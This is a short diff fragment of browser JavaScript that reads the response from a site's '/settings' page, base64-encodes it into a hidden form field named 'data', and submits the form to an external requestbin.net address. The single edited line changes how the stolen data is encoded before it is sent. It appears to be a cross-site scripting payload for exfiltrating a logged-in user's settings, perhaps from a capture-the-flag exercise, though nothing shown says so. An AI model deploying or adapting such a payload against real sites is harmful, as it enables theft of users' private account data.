@@ -8,7 +8,7 @@ fetch("/settings", {
         f.method = 'post';
         f.action = 'http://requestbin.net/r/rj93qcrj';
         i.name = 'data';
-        i.value = btoa(encodeURI(back));
+        i.value = btoa(back);
         f.appendChild(i);
         document.body.appendChild(f);
         f.submit();
